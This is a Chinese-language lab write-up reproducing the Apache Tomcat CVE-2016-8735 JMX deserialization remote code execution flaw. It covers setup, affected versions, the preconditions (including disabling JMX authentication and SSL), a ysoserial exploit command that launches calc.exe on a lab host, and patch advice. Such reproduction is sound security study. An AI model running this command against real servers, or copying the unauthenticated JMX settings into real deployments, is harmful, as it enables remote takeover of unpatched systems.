### 介绍

Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。

### 环境搭建

```
Java环境安装
https://www.java.com/en/download/manual.jsp
Tomcat
https://tomcat.apache.org/download-70.cgi
```

1、下载并解压

![image-20200811143448762](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200811143320510.png)

2、双击执行启动服务

```
http://192.168.3.156:8080/
```

![image-20200811143448762](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200811143448762.png)

#### Tomcat结构介绍

下载解压后存在目录、文件信息：

```shell
bin-----存放Tomcat的脚本文件，例如启动、关闭
conf----Tomcat的配置文件，例如server.xml和web.xml
lib-----存放Tomcat运行需要的库文件（JAR包）
logs----存放Tomcat执行时的LOG文件
temp----存放Tomcat运行时所产生的临时文件
webapps-Web发布目录，默认情况下把Web应用文件放于此目录
work----存放jsp编译后产生的class文件
```

### 漏洞分类实战

#### CVE-2016-8735

##### 漏洞描述

Oracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。

##### 影响范围

Apache Tomcat 9.0.0.M1 to 9.0.0.M11 

Apache Tomcat 8.5.0 to 8.5.6 

Apache Tomcat 8.0.0.RC1 to 8.0.38 

Apache Tomcat 7.0.0 to 7.0.72 

Apache Tomcat 6.0.0 to 6.0.47

##### 漏洞原理

该漏洞的诱因存在于Oracle已经修复的JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。因为Tomcat也使用了JmxRemoteLifecycleListener监听功能，但并没有及时升级，导致该远程代码执行漏洞。

##### 漏洞条件

1、要外部开启JmxRemoteLifecycleListener监听端口，实现远程利用。 

```xml
conf/server.xml
<Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" />
```

![image-20200812101526860](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200812101526860.png)

2、下载对应jar放到lib目录下：

- catalina-jmx-remote.jar要与对应tomcat版本一致[不同版本下载](https://archive.apache.org/dist/tomcat/)一般存在extras文件下，如下图所示
- [groovy2.3.9](https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9)下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）

![image-20200812102130773](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200812102130773.png)

![image-20200811163431177](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200811163431177.png)

3、接着修改bin/catalina.bat，在Execute The Requested Command处上面添加

```java
set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false
```

- -Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯
- -Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证

![image-20200812101910590](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200812101910590.png)

4、服务启动

下图所示：服务已启动10001端口已启动

![image-20200812103050881](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200812103050881.png)

##### 漏洞检测

1、执行以下PoC

```java
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.165 10001 Groovy1 calc.exe
```

Java 1.8出现报错

![image-20200812104703039](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/image-20200812104703039.png)

1.7的jdk成功弹出计算器

![PoC](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2016-8735/images/PoC.gif)

##### 漏洞修复

紧急措施：关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。同时，增加严格的认证方式。

升级jdk（目前测试1.8是无法利用）

推荐方案：官方已经发布了版本更新，建议您升级到最新版本。

- Apache Tomcat 9.0.0.M13或更新版本(Apache Tomcat 9.0.0.M12也修复了此漏洞，但并未发布)
- Apache Tomcat 8.5.8或更新版本(Apache Tomcat 8.5.7也修复了此漏洞，但并未发布)
- Apache Tomcat 8.0.39或更新版本
- Apache Tomcat 7.0.73或更新版本
- Apache Tomcat 6.0.48或更新版本